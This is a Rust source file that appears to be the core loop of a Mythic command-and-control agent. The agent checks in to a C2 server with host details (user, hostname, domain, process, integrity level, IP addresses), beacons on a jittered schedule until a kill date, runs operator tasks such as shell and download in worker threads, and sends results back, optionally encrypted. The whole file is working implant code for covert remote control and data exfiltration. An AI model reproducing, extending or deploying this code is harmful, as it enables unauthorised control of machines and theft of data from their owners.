use core::sync::atomic::Ordering;
use std::panic::catch_unwind;
use std::sync::{
    Arc, Mutex,
    mpsc::{self, Receiver, RecvTimeoutError, Sender, SyncSender, TrySendError},
};
use std::thread::sleep;
use std::time::{Duration, Instant};

use mythic::{
    Aes256HmacCrypto, AgentMessageExtras, AgentResponseExtras, C2Transport, MythicAgent,
    MythicError, MythicResult, ReqPostResponse, RespGetTasking, TaskResponse, decode_message,
    decode_message_plain, encode_message, encode_message_plain,
};
use rand::seq::SliceRandom;
use serde::Deserialize;
use uuid::Uuid;

use crate::config::Config;
use crate::dispatch;
use crate::sys::metadata;
use crate::{
    DEBUG, EXIT_PROCESS, INTERVAL, JITTER, KILLDATE, SHOULD_EXIT, set_killdate, set_sleep,
    take_extra,
};

// ── Helpers ─────────────────────────────────────────────

const TASK_WORKER_THREADS: usize = 4;
const CWD_TASK_WORKER_THREADS: usize = 1;
const TASK_QUEUE_CAPACITY: usize = 32;
const CWD_TASK_QUEUE_CAPACITY: usize = 32;
const MAX_POST_RESPONSE_DRAIN_CYCLES: usize = 10_000;
const MIN_BEACON_DELAY: Duration = Duration::from_millis(250);

struct CompletedTask {
    command: String,
    responses: Vec<TaskResponse>,
}

/// Dispatch a task, catching panics so one bad handler can't crash the agent.
fn safe_dispatch(task: &mythic::TaskMessage) -> TaskResponse {
    let t = task.clone();
    catch_unwind(move || dispatch::dispatch(&t))
        .unwrap_or_else(|_| TaskResponse::failed(task.id, "task handler panicked"))
}

/// Run a handler and return its primary response plus any extra responses
/// pushed via `crate::push_extra` (e.g. multi-chunk download chunks).
fn safe_dispatch_with_extras(task: &mythic::TaskMessage) -> Vec<TaskResponse> {
    let primary = safe_dispatch(task);
    let extras = take_extra();
    let mut out = Vec::with_capacity(1 + extras.len());
    out.push(primary);
    out.extend(extras);
    out
}

fn dispatch_task(task: mythic::TaskMessage, completed_tx: &Sender<CompletedTask>) {
    let command = task.command.clone();
    let responses = safe_dispatch_with_extras(&task);
    let _ = completed_tx.send(CompletedTask { command, responses });
}

fn is_control_task(command: &str) -> bool {
    matches!(command, "sleep" | "exit")
}

fn start_task_workers(
    worker_count: usize,
    queue_capacity: usize,
    completed_tx: Sender<CompletedTask>,
) -> SyncSender<mythic::TaskMessage> {
    let (task_tx, task_rx) = mpsc::sync_channel::<mythic::TaskMessage>(queue_capacity.max(1));
    let task_rx = Arc::new(Mutex::new(task_rx));

    for _ in 0..worker_count.max(1) {
        let task_rx = Arc::clone(&task_rx);
        let completed_tx = completed_tx.clone();
        std::thread::spawn(move || {
            loop {
                let task = {
                    let receiver = task_rx
                        .lock()
                        .unwrap_or_else(|poisoned| poisoned.into_inner());
                    receiver.recv()
                };
                match task {
                    Ok(task) => dispatch_task(task, &completed_tx),
                    Err(_) => break,
                }
            }
        });
    }

    task_tx
}

fn queue_task_or_fail(
    task: mythic::TaskMessage,
    task_tx: &SyncSender<mythic::TaskMessage>,
    completed_tx: &Sender<CompletedTask>,
) -> MythicResult<()> {
    match task_tx.try_send(task) {
        Ok(()) => Ok(()),
        Err(TrySendError::Full(task)) => {
            let command = task.command.clone();
            let response = TaskResponse::failed(
                task.id,
                "agent task queue is full; retry after current tasks complete",
            );
            let _ = completed_tx.send(CompletedTask {
                command,
                responses: vec![response],
            });
            Ok(())
        }
        Err(TrySendError::Disconnected(_)) => {
            Err(MythicError::protocol("task worker queue closed"))
        }
    }
}

fn get_agent<C: C2Transport>(payload_uuid: Uuid, c2s: &[C]) -> MythicResult<MythicAgent> {
    for c2 in c2s {
        // If the C2 profile type carries an external_ip_check flag, honour it.
        // For the upstream C2Transport trait we don't have such a method, so
        // we look it up via any concrete wrapper (HttpProfile / C2Profile) that
        // the agent loop was given. When unavailable, the external IP is
        // always queried — this matches the previous (pre-fix) behaviour.
        let external_ip = metadata::external_ip();
        if let Ok(agent) = MythicAgent::easy_checkin(
            payload_uuid,
            c2,
            metadata::local_ips(),
            metadata::os(),
            metadata::user(),
            metadata::hostname(),
            metadata::pid(),
            metadata::arch(),
            metadata::domain(),
            metadata::integrity_level(),
            external_ip,
            None,
            None,
            metadata::process_name(),
        ) {
            return Ok(agent);
        }
    }
    Err(MythicError::InvalidPacket)
}

fn get_tasking_with<C: C2Transport>(
    mythic: &MythicAgent,
    task_size: u32,
    c2: &C,
    responses: Vec<TaskResponse>,
) -> MythicResult<RespGetTasking> {
    let extras = AgentMessageExtras {
        responses,
        ..Default::default()
    };
    mythic.get_tasking_with(task_size, c2, extras)
}

#[derive(Debug, Deserialize)]
struct RichPostResponse {
    #[allow(dead_code)]
    action: String,
    #[serde(default)]
    responses: Vec<dispatch::PostResponseReceipt>,
    #[serde(flatten)]
    #[allow(dead_code)]
    extras: AgentResponseExtras,
}

fn post_response_rich<C: C2Transport>(
    mythic: &MythicAgent,
    responses: Vec<TaskResponse>,
    c2: &C,
) -> MythicResult<RichPostResponse> {
    let req = ReqPostResponse::new(responses);
    if let Some(key_b64) = c2.get_aes_psk() {
        let crypto = Aes256HmacCrypto::from_base64_key(&key_b64)?;
        let iv = c2.random_iv()?;
        let packed = encode_message(&req, mythic.callback_uuid(), &crypto, &iv)?;
        let response = c2.post_response(&packed)?;
        decode_message(&response, Some(mythic.callback_uuid()), &crypto).map(|(_, r)| r)
    } else {
        let packed = encode_message_plain(&req, mythic.callback_uuid())?;
        let response = c2.post_response(&packed)?;
        decode_message_plain(&response, Some(mythic.callback_uuid())).map(|(_, r)| r)
    }
}

fn post_pending_once<C: C2Transport>(
    mythic: &MythicAgent,
    c2: &C,
    pending: &mut Vec<TaskResponse>,
) -> MythicResult<()> {
    if pending.is_empty() {
        return Ok(());
    }
    let batch = std::mem::take(pending);
    let cloned_for_retry = batch.clone();
    match post_response_rich(mythic, batch, c2) {
        Ok(receipt) => {
            pending.extend(dispatch::responses_from_post_response_receipts(
                &receipt.responses,
            ));
            Ok(())
        }
        Err(e) => {
            pending.extend(cloned_for_retry);
            Err(e)
        }
    }
}

fn post_pending_until_drained<C: C2Transport>(
    mythic: &MythicAgent,
    c2: &C,
    pending: &mut Vec<TaskResponse>,
) -> MythicResult<()> {
    for _ in 0..MAX_POST_RESPONSE_DRAIN_CYCLES {
        if pending.is_empty() {
            return Ok(());
        }
        post_pending_once(mythic, c2, pending)?;
    }
    Err(MythicError::protocol(format!(
        "post_response drain exceeded {MAX_POST_RESPONSE_DRAIN_CYCLES} cycles with {} response(s) still pending",
        pending.len()
    )))
}

fn flush_pending<C: C2Transport>(mythic: &MythicAgent, c2: &C, mut pending: Vec<TaskResponse>) {
    if pending.is_empty() {
        return;
    }
    let total = pending.len();
    info!("[*] flushing {} response(s) before exit", total);
    for attempt in 1..=3u32 {
        match post_pending_until_drained(mythic, c2, &mut pending) {
            Ok(_) => return,
            Err(e) => {
                if DEBUG.load(Ordering::Relaxed) {
                    eprintln!("[!] flush attempt {attempt}/3 failed: {e}");
                }
                if attempt < 3 {
                    sleep(Duration::from_secs(1));
                }
            }
        }
    }
    if DEBUG.load(Ordering::Relaxed) {
        eprintln!("[!] flush dropped {total} response(s) after 3 attempts");
    }
}

/// If EXIT_PROCESS is set, terminate the process after flushing responses.
fn maybe_exit_process() {
    if EXIT_PROCESS.load(Ordering::Acquire) {
        info!("[*] exiting process");
        std::process::exit(0);
    }
}

fn next_beacon_delay() -> Duration {
    let interval = INTERVAL.load(Ordering::Acquire);
    if interval == 0 {
        return MIN_BEACON_DELAY;
    }
    // JITTER is a percentage (0–100): extra sleep = interval * jitter% * random
    let jitter_pct = JITTER.load(Ordering::Acquire).min(100);
    let jitter_secs = if jitter_pct > 0 {
        (interval * jitter_pct / 100) as f64 * rand::random::<f64>()
    } else {
        0.0
    };
    let total_sleep = interval as f64 + jitter_secs;
    Duration::from_secs_f64(total_sleep.max(0.0))
}

fn handle_completed_task(
    completed: CompletedTask,
    pending: &mut Vec<TaskResponse>,
    next_tasking_at: &mut Instant,
) {
    if completed.command == "sleep" {
        *next_tasking_at = Instant::now() + next_beacon_delay();
    }
    pending.extend(completed.responses);
}

fn post_ready_responses<C: C2Transport, R: rand::Rng + ?Sized>(
    mythic: &MythicAgent,
    profiles: &[C],
    rng: &mut R,
    pending: &mut Vec<TaskResponse>,
) -> MythicResult<()> {
    if pending.is_empty() {
        return Ok(());
    }
    let c2 = profiles.choose(rng).unwrap();
    post_pending_until_drained(mythic, c2, pending)
}

fn wait_for_responses_until<C: C2Transport, R: rand::Rng + ?Sized>(
    mythic: &MythicAgent,
    profiles: &[C],
    rng: &mut R,
    completed_rx: &Receiver<CompletedTask>,
    pending: &mut Vec<TaskResponse>,
    next_tasking_at: &mut Instant,
) -> MythicResult<()> {
    loop {
        while let Ok(completed) = completed_rx.try_recv() {
            handle_completed_task(completed, pending, next_tasking_at);
        }

        post_ready_responses(mythic, profiles, rng, pending)?;

        if SHOULD_EXIT.load(Ordering::Acquire)
            || past_killdate()
            || Instant::now() >= *next_tasking_at
        {
            return Ok(());
        }

        let timeout = next_tasking_at
            .saturating_duration_since(Instant::now())
            .min(Duration::from_secs(60));
        match completed_rx.recv_timeout(timeout) {
            Ok(completed) => handle_completed_task(completed, pending, next_tasking_at),
            Err(RecvTimeoutError::Timeout) => {}
            Err(RecvTimeoutError::Disconnected) => return Ok(()),
        }
    }
}

fn past_killdate() -> bool {
    let kd = KILLDATE.load(Ordering::Acquire);
    if kd == 0 {
        return false;
    }
    let now = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0);
    now >= kd
}

fn parse_killdate_ts(s: &str) -> u64 {
    match chrono::NaiveDate::parse_from_str(s, "%Y-%m-%d") {
        Ok(d) => d
            .and_hms_opt(0, 0, 0)
            .map(|dt| dt.and_utc().timestamp() as u64)
            .unwrap_or(0),
        Err(_) => 0,
    }
}

// ── Main loop ───────────────────────────────────────────

pub fn run(config: Config) -> MythicResult<()> {
    let payload_uuid = config.payload_uuid;
    info!("[*] Agent start, payload_uuid={}", payload_uuid);

    let profiles = config.c2_profiles;
    if profiles.is_empty() {
        if DEBUG.load(Ordering::Relaxed) {
            eprintln!("[!] no C2 profiles configured, exiting");
        }
        return Ok(());
    }
    if profiles.iter().any(|p| p.encrypted_exchange_check()) {
        return Err(MythicError::protocol(
            "encrypted_exchange_check is configured but not implemented",
        ));
    }

    // Wire per-profile flags (currently: external_ip_check) into the metadata
    // module so the easy_checkin call below honours the operator's intent.
    metadata::set_external_ip_check(profiles.iter().any(|p| p.external_ip_check()));

    let mythic = get_agent(payload_uuid, &profiles)?;

    set_sleep(
        profiles[0].callback_interval(),
        Some(profiles[0].callback_jitter()),
    );

    if let Some(ref kd) = profiles[0].killdate() {
        let ts = parse_killdate_ts(kd);
        if ts > 0 {
            set_killdate(ts);
            if past_killdate() {
                info!("[*] past killdate ({kd}), exiting");
                return Ok(());
            }
        }
    }

    let mut rng = rand::thread_rng();
    let mut pending: Vec<TaskResponse> = Vec::new();
    let (completed_tx, completed_rx) = mpsc::channel::<CompletedTask>();
    let task_tx = start_task_workers(
        TASK_WORKER_THREADS,
        TASK_QUEUE_CAPACITY,
        completed_tx.clone(),
    );
    let cwd_task_tx = start_task_workers(
        CWD_TASK_WORKER_THREADS,
        CWD_TASK_QUEUE_CAPACITY,
        completed_tx.clone(),
    );
    let mut next_tasking_at = Instant::now() + next_beacon_delay();

    loop {
        if let Err(e) = wait_for_responses_until(
            &mythic,
            &profiles,
            &mut rng,
            &completed_rx,
            &mut pending,
            &mut next_tasking_at,
        ) {
            if DEBUG.load(Ordering::Relaxed) {
                eprintln!("[!] post_response failed: {e}");
            }
            next_tasking_at = Instant::now() + Duration::from_secs(5);
            continue;
        }

        if past_killdate() {
            println!("[*] past killdate, exiting");
            let c2 = profiles.choose(&mut rng).unwrap();
            flush_pending(&mythic, c2, pending);
            maybe_exit_process();
            return Ok(());
        }

        if SHOULD_EXIT.load(Ordering::Acquire) {
            let c2 = profiles.choose(&mut rng).unwrap();
            flush_pending(&mythic, c2, pending);
            maybe_exit_process();
            info!("[*] agent exited (thread)");
            return Ok(());
        }

        let c2 = profiles.choose(&mut rng).unwrap();
        match get_tasking_with(&mythic, 5, c2, Vec::new()) {
            Ok(tasking) => {
                if DEBUG.load(Ordering::Relaxed) {
                    info!("task: {:?}", tasking);
                }
                for task in tasking.tasks {
                    if is_control_task(&task.command) {
                        dispatch_task(task, &completed_tx);
                        continue;
                    }

                    if dispatch::command_uses_process_cwd(&task.command) {
                        queue_task_or_fail(task, &cwd_task_tx, &completed_tx)?;
                    } else {
                        queue_task_or_fail(task, &task_tx, &completed_tx)?;
                    }
                }
                next_tasking_at = Instant::now() + next_beacon_delay();
            }
            Err(e) => {
                if DEBUG.load(Ordering::Relaxed) {
                    eprintln!("[!] get_tasking failed: {e}");
                }
                next_tasking_at = Instant::now() + Duration::from_secs(5);
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::collections::HashSet;

    #[test]
    fn task_workers_dispatch_queued_tasks() {
        let (completed_tx, completed_rx) = mpsc::channel::<CompletedTask>();
        let task_tx = start_task_workers(TASK_WORKER_THREADS, TASK_QUEUE_CAPACITY, completed_tx);
        let mut ids = HashSet::new();

        for i in 0..(TASK_WORKER_THREADS + 3) {
            let id = Uuid::new_v4();
            ids.insert(id);
            task_tx
                .send(mythic::TaskMessage {
                    id,
                    command: format!("unknown_{i}"),
                    parameters: "{}".into(),
                    ..Default::default()
                })
                .unwrap();
        }
        drop(task_tx);

        let mut received = HashSet::new();
        for _ in 0..ids.len() {
            let completed = completed_rx
                .recv_timeout(Duration::from_secs(2))
                .expect("worker should return a completed response");
            assert_eq!(completed.responses.len(), 1);
            received.insert(completed.responses[0].task_id);
        }

        assert_eq!(received, ids);
    }

    #[test]
    fn control_tasks_do_not_use_worker_queue() {
        assert!(is_control_task("sleep"));
        assert!(is_control_task("exit"));
        assert!(!is_control_task("shell"));
        assert!(!is_control_task("download"));
    }

    #[test]
    fn full_task_queue_returns_task_failure() {
        let (task_tx, _task_rx) = mpsc::sync_channel::<mythic::TaskMessage>(0);
        let (completed_tx, completed_rx) = mpsc::channel::<CompletedTask>();
        let task_id = Uuid::new_v4();

        queue_task_or_fail(
            mythic::TaskMessage {
                id: task_id,
                command: "ps".into(),
                parameters: "{}".into(),
                ..Default::default()
            },
            &task_tx,
            &completed_tx,
        )
        .unwrap();

        let completed = completed_rx
            .recv_timeout(Duration::from_secs(1))
            .expect("full queue should emit a failed task response");
        assert_eq!(completed.command, "ps");
        assert_eq!(completed.responses.len(), 1);
        assert_eq!(completed.responses[0].task_id, task_id);
        assert_eq!(completed.responses[0].status.as_deref(), Some("error"));
    }

    #[test]
    fn zero_sleep_interval_does_not_busy_loop() {
        let old_interval = INTERVAL.swap(0, Ordering::AcqRel);
        let delay = next_beacon_delay();
        INTERVAL.store(old_interval, Ordering::Release);

        assert!(delay >= MIN_BEACON_DELAY);
    }
}
